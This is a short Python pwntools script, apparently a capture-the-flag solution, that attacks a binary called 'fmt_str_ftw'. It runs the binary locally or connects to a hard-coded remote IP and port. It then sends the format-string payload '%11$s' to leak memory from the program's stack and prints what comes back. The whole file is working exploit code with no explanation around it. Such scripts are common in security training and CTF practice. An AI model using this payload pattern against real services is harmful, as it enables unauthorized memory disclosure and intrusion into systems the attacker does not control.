#!/usr/bin/env python3.8

from pwn import *

elf = ELF("./fmt_str_ftw")

def conn():
    if args.LOCAL:
        return process([elf.path])
    else:
        return remote("139.59.0.163", 7777)


def main():
    p = conn()

    p.sendline("%11$s")
    print(p.recvall().decode())



if __name__ == "__main__":
    main()